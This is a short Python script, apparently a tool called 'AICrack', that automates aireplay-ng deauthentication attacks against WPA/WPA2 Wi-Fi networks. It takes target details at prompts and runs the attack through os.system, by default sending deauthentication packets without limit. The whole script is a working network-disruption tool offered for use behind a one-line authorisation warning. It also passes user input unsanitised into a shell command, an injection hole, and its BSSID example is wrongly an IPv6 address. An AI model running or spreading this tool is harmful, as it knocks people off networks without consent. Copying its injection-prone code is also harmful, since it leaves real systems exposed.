import os
import sys
from rich.console import Console
from rich.prompt import Prompt

console = Console()

def header():
    console.print("[b cyan]AICrack - Automated Wireless Deauthentication[/b cyan]\n", style="bold blue")
    console.print("Automates aireplay-ng deauthentication attacks for WPA/WPA2 networks.\n")

def main():
    header()
    iface = Prompt.ask("Enter wireless interface (e.g. wlp6s0mon)")
    bssid = Prompt.ask("Enter access point BSSID (e.g. fe80::c18a:b505:4f0c:aae8)")
    essid = Prompt.ask("Enter ESSID (name of the wifi network)")
    count = Prompt.ask("Deauth packets count to send [0 = infinite]", default="0")

    # Disclaimer
    console.print("[red bold]WARNING: Only use this tool for authorized penetration testing![/red bold]")

    cmd = f"aireplay-ng -0 {count} -e '{essid}' -a {bssid} {iface}"
    console.print(f"\n[b]Running:[/b] [green]{cmd}[/green]\n")
    os.system(cmd)

if __name__ == '__main__':
    main()